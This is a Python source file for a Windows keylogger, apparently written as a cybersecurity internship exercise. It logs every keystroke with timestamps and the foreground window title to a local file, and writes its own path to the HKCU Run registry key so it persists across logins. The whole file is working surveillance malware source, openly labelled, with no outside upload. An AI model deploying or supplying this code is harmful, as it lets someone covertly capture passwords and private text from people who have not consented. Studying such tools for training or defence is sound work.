import pynput
import threading
import datetime
import os
import sys


import win32gui
import win32process
import winreg


log_dir = r"C:\Users\SAMURAI\python programs\cybersecuriy-intern-prodigy\simple-keylogger-key logs"
log_file = os.path.join(log_dir, f"keystrokes_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.log")

# Create the log directory if it doesn't exist
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Global variable to store the current window title
current_window = None

def get_active_window_title():
    try:
        pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except Exception as e:
        return "Unknown Window"

def on_press(key):

    global current_window
    window_title = get_active_window_title()

    if window_title and window_title != current_window:
        current_window = window_title
        with open(log_file, "a") as f:
            f.write(f"\n[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Active Window: {current_window}\n")

    try:
        char = key.char
        log_entry = f"[{datetime.datetime.now().strftime('%H:%M:%S')}] {char}"
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            log_entry = f"[{datetime.datetime.now().strftime('%H:%M:%S')}] [SPACE]"
        elif key == pynput.keyboard.Key.enter:
            log_entry = f"[{datetime.datetime.now().strftime('%H:%M:%S')}] [ENTER]"
        elif key == pynput.keyboard.Key.backspace:
            log_entry = f"[{datetime.datetime.now().strftime('%H:%M:%S')}] [BACKSPACE]"
        else:
            log_entry = f"[{datetime.datetime.now().strftime('%H:%M:%S')}] [{str(key).replace('Key.', '')}]"

    with open(log_file, "a") as f:
        f.write(log_entry + "\n")

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

def start_keylogger():
    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def add_to_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        script_path = os.path.abspath(__file__)
        winreg.SetValueEx(key, "Keylogger", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
        print("Script added to Windows startup.")
    except Exception as e:
        print(f"Failed to add to startup: {e}")

if __name__ == "__main__":
    if sys.platform == 'win32':
        add_to_startup()
    
    print(f"Keylogger started. Logging to {log_file}")
    print("Press 'Esc' to stop.")

    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()